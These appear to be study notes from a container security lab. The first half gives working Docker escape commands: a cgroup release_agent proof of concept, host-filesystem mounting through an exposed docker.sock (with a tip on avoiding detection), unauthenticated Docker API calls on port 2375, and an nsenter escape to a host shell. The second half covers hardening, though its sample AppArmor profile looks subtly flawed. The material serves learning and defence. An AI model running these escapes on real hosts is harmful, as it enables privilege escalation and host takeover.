**Container Security:**

  

 — —  — —  — —  — —  — —  — —  Vulnerabilities:  — —  — —  — —  — —  — — 

  

1. privileged containers - they can directly send commands to host operating system instead of docker engine

  

# Check container capabilities:

capsh --print

  

  

Sample output:

  

Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc

_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_wri

te,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read+ep

Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_

ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_

write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read

Securebits: 00/0x0/1'b0

 secure-noroot: no (unlocked)

 secure-no-suid-fixup: no (unlocked)

 secure-keep-caps: no (unlocked)

uid=0(root)

gid=0(root)

groups=0(root)

  

Example exploit for mount capability: [Proof of Concept (PoC) created by Trailofbits](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/#:~:text=The%20SYS_ADMIN%20capability%20allows%20a,security%20risks%20of%20doing%20so.) 

  

  

**1.** mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x

  

**2.** echo 1 > /tmp/cgrp/x/notify_on_release

  

**3.** host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`

  

**4.** echo "$host_path/exploit" > /tmp/cgrp/release_agent

  

**5.** echo '#!/bin/sh' > /exploit

  

**6.** echo "cat /home/cmnatic/flag.txt > $host_path/flag.txt" >> /exploit

  

**7.** chmod a+x /exploit

**8.** sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"

  

**1.** We need to create a group to use the Linux kernel to write and execute our exploit. The kernel uses "cgroups" to manage processes on the operating system. Since we can manage "cgroups" as root on the host, we'll mount this to "_/tmp/cgrp_" on the container.

**2**. For our exploit to execute, we'll need to tell the kernel to run our code. By adding "1" to "_/tmp/cgrp/x/notify_on_release_", we're telling the kernel to execute something once the "cgroup" finishes. [(Paul Menage., 2004)](https://www.kernel.org/doc/Documentation/cgroup-v1/cgroups.txt).

**3.** We find out where the container's files are stored on the host and store it as a variable.

**4.** We then echo the location of the container's files into our "_/exploit_" and then ultimately to the "release_agent" which is what will be executed by the "cgroup" once it is released.

**5.** Let's turn our exploit into a shell on the host

**6.** Execute a command to echo the host flag into a file named "flag.txt" in the container once "_/exploit_" is executed.

**7.** Make our exploit executable!

**8.** We create a process and store that into "_/tmp/cgrp/x/cgroup.procs_". When the processs is released, the contents will be executed.

  

  

————————————————————————

  

  

1. Exposed Docker daemon

  

- Should be a member  of ‘docker’ group or be root

  

# Find docker socket in container:

find / -type f -name 'docker.sock' 2> /dev/null

  

# For linux

ls -l /var/run/docker.sock

  

Exploit:

  

We will use Docker to create a new container and mount the host's filesystem into this new container. Then we are going to access the new container and look at the host's filesystem.

  

Our final command will look like this: docker run -v /:/mnt --rm -it alpine chroot /mnt sh, which does the following:

**1.** We will need to upload a docker image. For this room, I have provided this on the VM. It is called "alpine". The "alpine" distribution is not a necessity, but it is extremely lightweight and will blend in a lot better. To avoid detection, it is best to use an image that is already present in the system, otherwise, you will have to upload this yourself.

**2**. We will use docker run to start the new container and mount the host's file system (/) to (/mnt) in the new container: docker run -v /:/mnt 

**3.** We will tell the container to run interactively (so that we can execute commands in the new container): -it

**4.** Now, we will use the already provided alpine image: alpine

**5.** We will use chroot to change the root directory of the container to be _/mnt_ (where we are mounting the files from the host operating system): chroot /mnt

**6.** Now, we will tell the container to run sh to gain a shell and execute commands in the container: sh

-------

You may need to "**Ctrl + C**" to cancel the exploit once or twice for this vulnerability to work, but, as you can see below, we have successfully mounted the host operating system's filesystem into the new alpine container.

  

  

————————————————————————

  

  

1. Remote code execution

  

- The Docker Engine will listen on a port (default 2375) when configured to be run remotely.

  

# If Docker daemon is running on port 2375, then docker commands can be sent via http calls

  

# Check docker version

curl http://10.10.177.179:2375/version

  

# Running docker commands on remote server

docker -H tcp://10.10.177.179:2375 ps

  

————————————————————————

  

  

1. Abusing Namespace

  

# Find if we are in container

  

# Usually containers have less number of processes

ps aux

  

  

# Abusing the case where containers share the same namespace as host (the container can communicate with the processes on the host)

  

  

Use the following exploit: 

  

nsenter --target 1 --mount --uts --ipc --net /bin/bash

  

which does the following:

  

**1.** We use the --target switch with the value of "**1**" to execute our shell command that we later provide to execute in the namespace of the special system process ID to get the ultimate root!

**2**. Specifying --mount this is where we provide the mount namespace of the process that we are targeting. _"If no file is specified, enter the mount namespace of the target process."_ [(Man.org., 2013)](https://man7.org/linux/man-pages/man1/nsenter.1.html).

**3.** The --uts switch allows us to share the same UTS namespace as the target process meaning the same hostname is used. This is important as mismatching hostnames can cause connection issues (especially with network services).

**4.** The --ipc switch means that we enter the Inter-process Communication namespace of the process which is important. This means that memory can be shared.

**5.** The --net switch means that we enter the network namespace meaning that we can interact with network-related features of the system. For example, the network interfaces. We can use this to open up a new connection (such as a stable reverse shell on the host).

**6.** As we are targeting the **"/sbin/init"** process #1 (although it's a symbolic link to "**lib/systemd/systemd**" for backwards compatibility), we are using the namespace and permissions of the [systemd](https://www.freedesktop.org/wiki/Software/systemd/) daemon for our new process (the shell)

**7.** Here's where our process will be executed into this privileged namespace: sh or a shell. This will execute in the same namespace (and therefore privileges) of the kernel.

--------

You may need to "**Ctrl + C**" to cancel the exploit once or twice for this vulnerability to work, but as you can see below, we have escaped the docker container and can look around the host OS (showing the change in hostname)

  

  

 — —  — —  — —  — —  — —  — —  Hardening:  — —  — —  — —  — —  — — 

  

1. Protect docker daemon

  

- Run docker command via SSH to control engine running on remote host 

- docker context create --docker host=[ssh://myuser@remotehost](ssh://myuser@remotehost) --description="Development Environment”`

- Enable Docker to accept commands on valid TLS connection

- One server: dockerd --tlsverify --tlscacert=myca.pem --tlscert=myserver-cert.pem --tlskey=myserver-key.pem -H=0.0.0.0:2376
- On client: docker --tlsverify --tlscacert=myca.pem --tlscert=client-cert.pem --tlskey=client-key.pem -H=SERVERIP:2376 info`

  

1. Implement control groups

  

- Limit core counts: docker run -it --cpus="1" mycontainer
- Limit allowed memory: docker run -it --memory="20m" mycontainer
- Limit resources on running container: docker update --memory="40m" mycontainer
- Check allowed resources: docker inspect mycontainer

  

1. Avoid over-privileged container

  

- Specify capabilities to assign: docker run -it --rm --cap-drop=ALL --cap-add=NET_BIND_SERVICE mywebserver

  

1. Protect using seccomp/apparmor 

  

- AppArmor determines what resources an application can access (i.e., CPU, RAM, Network interface, filesystem, etc) and what actions it can take on those resources.
- Seccomp is within the program itself, which restricts what system calls the process can make (i.e. what parts of the CPU and operating system functions).

  

  

# Sample Seccomp profile for a webserver

  

# profile.json

  

{

  "defaultAction": "SCMP_ACT_ALLOW",

  "architectures": [

    "SCMP_ARCH_X86_64",

    "SCMP_ARCH_X86",

    "SCMP_ARCH_X32"

  ],

  "syscalls": [

    { "names": [ "read", "write", "exit", "exit_group", "open", "close", "stat", "fstat", "lstat", "poll", "getdents", "munmap", "mprotect", "brk", "arch_prctl", "set_tid_address", "set_robust_list" ], "action": "SCMP_ACT_ALLOW" },

    { "names": [ "execve", "execveat" ], "action": "SCMP_ACT_ERRNO" }

  ]

}

  

# Apply above profile

docker run --rm -it --security-opt seccomp=/home/cmnatic/container1/seccomp/profile.json mycontainer

  

# Sample apparmor profile

  

# profile.json

  

/usr/sbin/httpd {

  

  capability setgid,

  capability setuid,

  

  /var/www/** r,

  /var/log/apache2/** rw,

  /etc/apache2/mime.types r,

  

  /run/apache2/apache2.pid rw,

  /run/apache2/*.sock rw,

  

  # Network access

  network tcp,

  

  # System logging

  /dev/log w,

  

  # Allow CGI execution

  /usr/bin/perl ix,

  

  # Deny access to everything else

  /** ix,

  deny /bin/**,

  deny /lib/**,

  deny /usr/**,

  deny /sbin/**

}

  

# Apply apparmor profile

docker run --rm -it --security-opt apparmor=/home/cmnatic/container1/apparmor/profile.json mycontainer

  

1. Review docker images

  

- Analyze docker images: [https://github.com/wagoodman/dive](https://github.com/wagoodman/dive)

  

|                       |                                                                                                                                                                                                           |                                                                                            |
| --------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------ |
| **Benchmarking Tool** | **Description**                                                                                                                                                                                           | **URL**                                                                                    |
| CIS Docker Benchmark  | This tool can assess a container's compliance with the CIS Docker Benchmark framework.                                                                                                                    | [https://www.cisecurity.org/benchmark/docker](https://www.cisecurity.org/benchmark/docker) |
| OpenSCAP              | This tool can assess a container's compliance with multiple frameworks, including CIS Docker Benchmark, NIST SP-800-190 and more.                                                                         | [https://www.open-scap.org/](https://www.open-scap.org/)                                   |
| Docker Scout          | This tool is a cloud-based service provided by Docker itself that scans Docker images and libraries for vulnerabilities. This tool lists the vulnerabilities present and provides steps to resolve these. | [https://docs.docker.com/scout/](https://docs.docker.com/scout/)                           |
| Anchore               | This tool can assess a container's compliance with multiple frameworks, including CIS Docker Benchmark, NIST SP-800-190 and more.                                                                         | [https://github.com/anchore/anchore-engine](https://github.com/anchore/anchore-engine)     |
| Grype                 | This tool is a modern and fast vulnerability scanner for Docker images                                                                                                                                    | [https://github.com/anchore/grype](https://github.com/anchore/grype)                       |